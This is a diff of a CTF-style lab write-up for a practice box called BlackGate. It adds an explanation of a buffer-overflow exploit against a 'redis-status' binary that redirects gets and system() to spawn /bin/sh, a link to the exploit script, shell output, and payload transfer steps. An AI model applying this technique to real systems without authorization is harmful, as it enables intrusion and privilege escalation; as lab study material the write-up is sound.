@@ -563,6 +563,11 @@ The offset is `264`. To exploit this binary since NX is disabled we need to make
 
 Since we know that the binary is going to call system(/usr/bin/systemctl) lets find a was to make it rather call system(/bin/sh) 
 
+Here's the idea of the exploit am about to create
+
+```
+Now we're going to do something interesting - we are going to call gets again. Most importantly, we will tell gets to write the data it receives to a section of the binary. We need somewhere both readable and writeable, so I choose the DATA. We pass a GOT entry to gets, and when it receives the input we send it will write the value given into the DATA section of the binary . Now we know exactly where our value is. To top it all off, we set the return address of our call to gets to where we wrote our input, and running system() on it, perfectly executing what we just inputted.
+```
 I'll check for writeable section of the binary using `readelf`
 
 ```
@@ -816,8 +821,37 @@ gef➤  x/s 0x000000000404048
 gef➤ 
 ```
 
-Now that we have the address, here's the exploit 
+Now that we have the address, here's the exploit [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/blackgate/exploit.py)
 
+Running it then inputting /bin/sh gives us shell
+
+```
+┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
+└─$ python3 exploit.py
+[+] Starting local process './redis-status': pid 143262
+[*] Switching to interactive mode
+[*] Redis Uptime
+Authorization Key: Wrong Authorization Key!
+Incident has been reported!
+$ /bin/sh
+$ ls -al
+total 48
+drwxr-xr-x  2 mark mark  4096 Feb 28 14:41 .
+drwxr-xr-x 43 mark mark  4096 Feb 28 00:59 ..
+-rw-r--r--  1 mark mark  1927 Feb 28 14:36 exploit.py
+-rw-------  1 mark mark   108 Feb 26 05:16 .gdb_history
+-rw-r--r--  1 mark mark  1827 Feb 28 03:23 getaddr.py
+-rw-r--r--  1 mark mark   793 Jan 21 12:12 nmapscan
+-rw-r--r--  1 mark mark   312 Feb 28 14:41 payload
+-rwxr-xr-x  1 mark mark 17056 Jan 21 15:41 redis-status
+$
+```
+
+I made an outfile where the payload is stored since the target doesn't have pwntool library, i'll transfer the payload to it
+![image](https://user-images.githubusercontent.com/113513376/221872650-8b0ae1be-1a8e-4450-8909-30f45c2237b0.png)
+
+Now that we've transfered the payload i'll run it on the binary
+![image](https://user-images.githubusercontent.com/113513376/221873141-12cff8c5-1484-4ca2-8838-4e1c08ec15b3.png)
 
 And we're done xD
 
